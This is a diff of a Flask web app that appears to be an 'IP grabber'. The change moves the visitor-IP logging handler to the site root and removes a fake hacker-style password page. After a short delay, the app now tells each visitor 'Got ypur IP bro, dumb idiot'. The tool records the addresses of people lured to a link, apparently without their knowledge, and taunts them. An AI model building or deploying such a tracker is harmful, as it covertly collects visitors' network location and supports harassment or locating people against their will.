@@ -23,7 +23,7 @@ def get_client_ip(request):
                 return ip
     return request.remote_addr or 'Unknown'
 
-@app.route('/visit')
+@app.route('/')
 def log_ip():
     ip = get_client_ip(request)
     
@@ -58,96 +58,7 @@ def log_ip():
 
     time.sleep(3)
     
-    return redirect(url_for("login"))
-
-PASSWORD = "GENGAOG"
-
-LOGIN_PAGE = """
-<!DOCTYPE html>
-<html lang="de">
-<head>
-<meta charset="UTF-8">
-<title>Terminal</title>
-<style>
-body{
-    background:black;
-    color:red;
-    font-family:Consolas, monospace;
-    display:flex;
-    justify-content:center;
-    align-items:center;
-    height:100vh;
-    margin:0;
-}
-.box{
-    width:700px;
-    border:2px solid red;
-    padding:20px;
-    box-shadow:0 0 20px red;
-}
-input{
-    width:100%;
-    padding:10px;
-    background:black;
-    color:red;
-    border:1px solid red;
-    margin-top:10px;
-    font-family:inherit;
-}
-button{
-    margin-top:10px;
-    padding:10px 20px;
-    background:red;
-    color:black;
-    border:none;
-    cursor:pointer;
-    font-weight:bold;
-}
-.error{
-    color:#ff5555;
-    margin-top:10px;
-}
-</style>
-</head>
-<body>
-
-<div class="box">
-<pre>
-===========================
- CONNECTING...
- DATA GOT LOGGED
- WAITING FOR PASSWORD...
-===========================
-</pre>
-
-<form method="POST">
-<input type="password" name="password" placeholder="Password" required>
-<button type="submit">LOGIN</button>
-</form>
-
-{% if message %}
-<p class="error">{{ message }}</p>
-{% endif %}
-
-</div>
-
-</body>
-</html>
-"""
-
-@app.route("/", methods=["GET", "POST"])
-def login():
-    message = ""
-
-    if request.method == "POST":
-        if request.form.get("password") == PASSWORD:
-            # Hier wird jetzt richtig zum Logger weitergeleitet
-            return redirect(url_for("log_ip"))
-            
-        else:
-            message = "Wrong password!"
-
-    return render_template_string(LOGIN_PAGE, message=message)
+    return "Got ypur IP bro, dumb idiot"
 
 if __name__ == "__main__":
     port = int(os.environ.get('PORT', 5000))
